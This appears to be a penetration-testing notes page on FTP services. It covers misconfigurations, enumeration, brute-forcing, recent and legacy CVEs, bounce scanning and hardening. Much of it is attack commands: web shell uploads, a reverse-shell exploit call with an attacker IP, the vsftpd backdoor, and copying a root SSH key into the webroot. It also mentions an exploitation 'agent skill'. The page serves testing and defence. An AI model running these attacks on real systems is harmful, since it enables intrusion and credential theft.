+++
title = 'FTP'
date = 2026-10-30
type = 'notes'
weight = 500
toc = true
tags = ['protocols', 'services', 'ftp']
+++

FTP is a clear-text protocol for file transfer that typically runs on **TCP port 21** (control channel). There are different commands and status codes in FTP, and **not all commands are consistently implemented on the server** — which is precisely what makes enumeration valuable: the banner, the supported command set, and the write permissions often determine the entire attack path.

> **2025–2026 context:** FTP is legacy infrastructure that remains in production because appliances, backup systems, and industrial equipment still depend on it. The current CVE feed is dominated by **two classes**: **FTP server implementations** with unauthenticated or authenticated RCE (Wing FTP Server, CrushFTP, ProFTPD, the Windows FTP Service), and **FTP client-side flaws** where a malicious server attacks the connecting client (Wget PASV, GVfs PASV). The client-side class is frequently overlooked — and it turns a seemingly harmless "connect to the target FTP" into a pivot into the attacker's own network.

---

## 1. Misconfigurations

### 1.1 Anonymous access

When allowed, a server offers anonymous FTP access. The options are usually limited, but the readable content is often the first foothold.

```bash
ftp anonymous@<target>
# Password: anonymous (or any email)

# Non-interactive recursive download
wget -m --no-passive ftp://anonymous:anonymous@<target>
```

**Anonymous login variants worth trying:**

```
anonymous / anonymous
anonymous / anonymous@
anonymous / (empty)
ftp / ftp
ftp / (empty)
```

### 1.2 Writable FTP + web server = shell

The highest-value FTP misconfiguration is **anonymous write access to a directory that the web server also serves**.

```
FTP root  ==  /var/www/html  (or a subdirectory)
→ upload shell.php via FTP
→ request http://target/shell.php
```

**The 2025–2026 pattern** in lab and real environments is exactly this chain: anonymous FTP access with upload capability, a PHP web shell uploaded to the FTP root, and execution through the web server because the FTP root maps to the web directory. TryHackMe's *Startup* box chains anonymous FTP → PHP web shell upload → cron job hijacking for root, and *Devel* chains anonymous FTP → ASPX web shell → MS11-046 kernel escalation.

**Upload a shell:**

```bash
ftp <target>
# Login anonymous
put php-reverse-shell.php
# or
put cmd.aspx
```

**Or with `curl`:**

```bash
curl -T shell.php ftp://anonymous:anonymous@<target>/
```

> **The prerequisite is that the web server serves the same directory.** Verify by uploading a harmless test file and requesting it over HTTP before uploading a shell.

### 1.3 FTP `PUT` method

If the FTP server allows `PUT` into a directory reachable by the web application, the same chain applies — the FTP server is the write primitive, the HTTP server is the execution primitive.

---

## 2. Basic Interaction

| Command | Purpose |
|---|---|
| `ftp <FQDN/IP>` | Interactive client |
| `ftp username@ip` | Login as a specific user |
| `nc -nv <FQDN/IP> 21` | Raw banner grab |
| `telnet <FQDN/IP> 21` | Raw banner grab (alternative) |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp` | **FTPS** — encrypted control channel |
| `wget -m --no-passive ftp://anonymous:anonymous@<target>` | Recursive download |

**Interactive commands:**

| Command | Purpose |
|---|---|
| `connect` | Set the remote host |
| `get` / `mget` | Download a file / multiple files |
| `put` / `mput` | Upload a file / multiple files |
| `ls` / `dir` | List the current directory |
| `cd` / `lcd` | Change remote / local directory |
| `binary` / `ascii` | Transfer mode |
| `passive` / `pass` | Toggle passive mode |
| `status` | Show the current connection state |
| `quit` | Exit |

---

## 3. Enumeration

### 3.1 Nmap

```bash
# Version detection + default FTP scripts
sudo nmap -sV -p21 -sC -A <target>

# All FTP scripts
nmap --script ftp-* -p 21 <target>

# Anonymous login check
nmap -p 21 --script ftp-anon <target>

# Specific backdoor checks
nmap -sV -p 21 --script ftp-proftpd-backdoor <target>
nmap -sV -p 21 --script ftp-vsftpd-backdoor <target>

# FTP bounce check
nmap -Pn -p21 --script ftp-bounce <target>
```

> **`ftp-syst` reveals system information**, `ftp-anon` confirms anonymous access, and `ftp-bounce` confirms whether the `PORT` command is honoured. These three scripts cover the majority of FTP misconfigurations in one pass.

### 3.2 Banner grabbing and version identification

```bash
nc -nv <target> 21
# or
nmap -sV -p21 <target>
```

The banner identifies the server (**vsftpd**, **ProFTPD**, **Pure-FTPd**, **FileZilla Server**, **Wing FTP**, **CrushFTP**, **Microsoft FTP Service**) and the version — which is the input to every CVE lookup in §6.

### 3.3 Directory traversal and file download

```bash
ftp <target>
# Login
ls -la
cd ..
ls -la
```

Some FTP servers allow `cd ..` above the FTP root — the older **BisonWare**, **Colorado**, and **TitanFTP** servers are known for directory traversal, and Metasploit has a console-less chain for them.

---

## 4. Authentication Bruteforcing

```bash
# Medusa
medusa -u username -P /usr/share/wordlists/rockyou.txt -h <target> -M ftp

# Hydra
hydra -l username -P /usr/share/wordlists/rockyou.txt ftp://<target>

# Hydra with a user list
hydra -L users.txt -P passwords.txt ftp://<target>
```

> **Rate-limit and check the lockout policy.** Some FTP servers disable the account after a few failures — and some (CVE-2025-49195, Media Server) **do not restrict authentication attempts at all**, which makes bruteforcing practical but noisy.

---

## 5. FTP Useful Files

| File | Purpose |
|---|---|
| `/etc/vsftpd.conf` | Default **vsftpd** configuration |
| `/etc/ftpusers` | **Deny list** — users prohibited from FTP login |
| `/etc/proftpd/proftpd.conf` | **ProFTPD** configuration |
| `/etc/pure-ftpd/pure-ftpd.conf` | **Pure-FTPd** configuration |
| `/etc/shadow` | Readable when FTP runs as root or the root is reachable via traversal |

---

## 6. Known Vulnerabilities (2025–2026)

### 6.1 Unauthenticated RCE — the highest-impact class

| CVE | Product | Primitive |
|---|---|---|
| **CVE-2025-47812** | **Wing FTP Server ≤ 7.4.3** | **CVSS 10.0** — a **NULL byte** in the `username` parameter causes **Lua code to be written into the session file**, leading to **unauthenticated RCE** after login. Public PoC and Metasploit module available; **CISA KEV listed** |
| **CVE-2025-47813** | Wing FTP Server | Information disclosure — leaks the installation path; **actively exploited in the wild as of July 2025** |
| **CVE-2025-2825 / CVE-2025-31161** | **CrushFTP** 10 < 10.8.4, 11 < 11.3.1 | **CVSS 9.8** — authentication bypass in the **AWS4-HMAC** authorisation method of the HTTP component → takeover of the **`crushadmin`** account (unless a DMZ proxy is used) |
| **CVE-2026-49172** | **Windows FTP Service** | **Heap-based buffer overflow** — remote, unauthenticated RCE over the network |
| **CVE-2025-5548** | FreeFloat FTP Server 1.0 | **Stack-based buffer overflow** — public PoC released October 2026 |

**Wing FTP Server exploit:**

```bash
# Metasploit
use exploit/multi/http/wingftp_request_auth_bypass
# or the Python PoC
python3 wingftp_exploit.py -t <target> -p 21 -l <attacker-ip> -lp 4444
```

**CrushFTP:**

```bash
# CVE-2025-31161 — authentication bypass
# The server verifies the user exists by calling login_user_pass() with no password requirement
curl -k "https://<target>:8080/WebInterface/function/?command=getUserList&username=crushadmin"
```

> **Wing FTP and CrushFTP are the two products to check first** on any FTP engagement in 2025–2026 — both have unauthenticated or trivially authenticated paths to RCE, and both are actively exploited.

### 6.2 Authenticated RCE

| CVE | Product | Primitive |
|---|---|---|
| **CVE-2026-44403** | **Wing FTP Server 8.1.2** | Authenticated RCE — unsafe serialisation of session values into **Lua source code** via the `mydirectory` field of a domain admin; closing delimiters are not escaped |
| **CVE-2026-63090** | **ProFTPD** < 1.3.9c, 1.3.10rc3 | **Heap-based buffer overflow** in `mod_sftp` — authenticated low-privilege attacker sends crafted SFTP fragments exceeding the **16 KB reassembly buffer** → arbitrary code execution |
| **CVE-2026-53994** | **ProFTPD** `mod_sftp` | Heap overflow via a **0-length SFTP packet** — the unsigned subtraction underflows to ~4 GB, the allocator returns a 512-byte block while the caller believes it has 4 GB → attacker-controlled heap overflow. Reliable authenticated DoS; further consequences depend on heap layout |

### 6.3 Legacy but still exploited

| CVE | Product | Primitive |
|---|---|---|
| **CVE-2011-2523** | **vsftpd 2.3.4** | **Backdoor** — a username ending in `:)` opens a **root shell on port 6200**. Still in the wild and still the canonical Metasploit module |
| **CVE-2015-3306** | **ProFTPD 1.3.5** `mod_copy` | **Pre-auth arbitrary file copy** — `SITE CPFR` / `SITE CPTO` copy files **server-side without transferring data to the client**. Used to copy an SSH private key to a web-accessible directory |
| — | **BisonWare / Colorado / TitanFTP** | Directory traversal — console-less Metasploit chain |

**vsftpd 2.3.4:**

```bash
# Metasploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target>
run
```

```bash
# Manual — connect with a username containing :)
ftp <target>
# User: hello:)
# Then connect to port 6200
nc <target> 6200
```

**ProFTPD `mod_copy`:**

```bash
# Copy an SSH key to the webroot
ftp <target>
# Then:
SITE CPFR /root/.ssh/id_rsa
SITE CPTO /var/www/html/id_rsa
```

Or with a single-file exploit:

```bash
python3 CVE-2015-3306.py --host <target> --port 21 \
  --source /root/.ssh/id_rsa --destination /var/www/html/id_rsa
```

> **`mod_copy` is a pre-auth file copy, not a file read.** It does not transfer the file to you — it copies it **on the server**, which is why the target must be a web-accessible directory, an SSH `authorized_keys`, or a cron directory.

### 6.4 Client-side vulnerabilities — the overlooked class

These do **not** require compromising the FTP server; they require the **victim to connect to a malicious FTP server**.

| CVE | Product | Primitive |
|---|---|---|
| **CVE-2026-15146** | **GNU Wget** | Wget does **not validate the IP address in an FTP PASV response** — a malicious FTP server returns an arbitrary IP and port, and Wget connects to it |
| **CVE-2026-28295** | **GVfs FTP backend** | The client **unconditionally trusts the IP and port in the PASV response** — a malicious server probes open ports on the client's internal network by observing **connection timing** (open ports hang, closed ports fail after 30 s) |

> **This is the reverse direction of FTP bounce.** Instead of using an FTP server to scan a third party, the attacker uses a **malicious FTP server** to make the **victim's client** scan the victim's own internal network.

### 6.5 Denial of service

| CVE | Product | Primitive |
|---|---|---|
| **CVE-2025-14242** | **vsftpd** < 3.0.3-35.el8_6.1 | **Integer overflow** in `ls` command parameter parsing → DoS |
| **CVE-2025-68206** | **Linux kernel** `nft_ct` | NAT sequence adjustment for PASV/EPSV — payload rewrite on the control connection |
| **CVE-2025-49195** | Media Server | FTP login **does not restrict authentication attempts** → unlimited bruteforce |

---

## 7. FTP Bounce Attack

An FTP bounce uses the FTP server as a **proxy** to reach a third host. The attacker sends a `PORT` command telling the server to open a data connection to a **different** IP and port — the server then connects to that target on the attacker's behalf.

**Scenario:** `FTP_DMZ` is internet-facing and can reach `Internal_DMZ`, which the attacker cannot reach directly. The attacker uses `FTP_DMZ` to scan and connect to `Internal_DMZ`.

```bash
# Port scan through the FTP server
nmap -Pn -v -n -p80 -b anonymous:password@<FTP_DMZ> <Internal_DMZ>
```

**Modern tooling:**

```bash
# Nmap native bounce scan
nmap -b <user>:<pass>@<ftp_server> <victim>
nmap -Pn -p21,80 -b ftp:ftp@10.2.1.5 127.0.0.1

# Nmap NSE — confirm the bounce works before scanning
nmap -Pn -p21 --script ftp-bounce <ftp_server>

# HackTricks example — scan internal ports through the middle FTP server
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```

> **`ftp-bounce` is the confirmation script.** If it returns `bounce working!`, the `PORT` command is honoured and the server can be used as a scanning proxy. Modern Nmap still supports `-b`; the defense is not tooling restrictions but **patching the FTP server** and blocking `PORT` to non-client addresses.

---

## 8. Tooling

| Tool | Purpose |
|---|---|
| **Nmap** `ftp-*` scripts | `ftp-anon`, `ftp-bounce`, `ftp-proftpd-backdoor`, `ftp-vsftpd-backdoor`, `ftp-syst` |
| **Hydra / Medusa** | Credential bruteforce |
| **`ftp-server-exploitation` agent skill** | Covers CrushFTP, vsftpd, ProFTPD, Pure-FTPd, FileZilla — auth bypass, file access, privilege escalation |
| **Metasploit** | `vsftpd_234_backdoor`, `proftpd_modcopy_exec`, `wingftp_request_auth_bypass`, `crushftp` modules |
| **`CVE-2015-3306` single-file exploits** | Pre-auth `mod_copy` file copy |
| **`CVE-2025-47812` PoC / Metasploit** | Wing FTP unauthenticated RCE |
| **`curl`** | `curl -T file ftp://user:pass@host/` — upload without an interactive client |
| **`wget -m --no-passive`** | Recursive anonymous download |

---

## 9. Testing Methodology

```text
1. Banner grab and version
   - nc -nv <target> 21
   - nmap -sV -p21 <target>
   - Identify: vsftpd, ProFTPD, Pure-FTPd, Wing FTP, CrushFTP, FileZilla, Microsoft FTP

2. Anonymous access
   - ftp anonymous@<target>
   - nmap --script ftp-anon
   - Try variants: anonymous/anonymous, anonymous/(empty), ftp/ftp

3. Directory traversal
   - cd .. repeatedly
   - Check for readable /etc/passwd, SSH keys, config files

4. Writable FTP + web server
   - Can you put a file? (put test.txt)
   - Is the FTP root served by HTTP? (curl http://target/test.txt)
   - Upload a web shell

5. Known vulnerabilities
   - vsftpd 2.3.4 → username :)
   - ProFTPD 1.3.5 mod_copy → SITE CPFR / CPTO
   - Wing FTP ≤ 7.4.3 → CVE-2025-47812
   - CrushFTP → CVE-2025-31161
   - Windows FTP → CVE-2026-49172

6. FTP bounce
   - nmap --script ftp-bounce
   - nmap -b user:pass@<ftp> <internal>

7. Client-side (if you control the server)
   - PASV IP/port manipulation → CVE-2026-15146 / CVE-2026-28295

8. Bruteforce (only if authorised and no lockout)
   - hydra / medusa
```

---

## 10. Hardening

| Control | How |
|---|---|
| **Use SFTP/FTPS** | Replace clear-text FTP entirely — `openssl s_client -starttls ftp` confirms FTPS |
| **Disable anonymous access** | `anonymous_enable=NO` in `vsftpd.conf` |
| **Restrict write permissions** | No upload to the webroot; separate the FTP root from the web root |
| **Patch the server** | Wing FTP ≥ 7.4.4, CrushFTP ≥ 10.8.4 / 11.3.1, ProFTPD ≥ 1.3.9c |
| **Disable `mod_copy`** | If not required, or restrict `SITE CPFR` / `CPTO` to authenticated, non-anonymous users |
| **Block `PORT` to third parties** | Prevents FTP bounce; Azure Firewall disables active FTP by default for this reason |
| **Fix PASV IP validation** | Clients must validate the PASV IP matches the control connection (Wget, GVfs) |
| **Rate-limit authentication** | Prevent unlimited bruteforce |

---

## 11. Field Notes

- **Wing FTP Server CVE-2025-47812 is the highest-priority check in 2026.** CVSS **10.0**, unauthenticated RCE, public PoC, CISA KEV listed — a NULL byte in the username writes Lua into the session file.
- **CrushFTP CVE-2025-31161 is the second.** CVSS **9.8**, authentication bypass in the AWS4-HMAC authorisation method, takeover of `crushadmin`.
- **The writable-FTP + web-server chain is still the most common lab and real-world path.** Upload a shell to the FTP root, request it over HTTP.
- **ProFTPD `mod_copy` is a server-side copy, not a download.** Use `SITE CPFR` / `SITE CPTO` to move an SSH key into the webroot.
- **vsftpd 2.3.4 is still the canonical backdoor.** The `:)` username opens a root shell on port 6200 — it is in every Metasploit installation for a reason.
- **Client-side FTP flaws are the overlooked class.** CVE-2026-15146 (Wget) and CVE-2026-28295 (GVfs) let a malicious server scan the victim's internal network through the victim's own client.
- **FTP bounce is still supported by Nmap.** `nmap -b` and the `ftp-bounce` NSE script both work — the defense is patching the server, not removing the tool.
- **`ftp-anon`, `ftp-bounce`, and `ftp-syst` are the three scripts to run first.** They cover anonymous access, bounce capability, and system information in one Nmap invocation.
- **The banner determines the entire attack path.** vsftpd → backdoor; ProFTPD → `mod_copy`; Wing FTP → CVE-2025-47812; CrushFTP → CVE-2025-31161; Microsoft FTP → CVE-2026-49172.
- **FTP is clear-text.** Even after compromise, credentials and commands are visible on the wire — which is why replacement with SFTP/FTPS is the only durable fix.
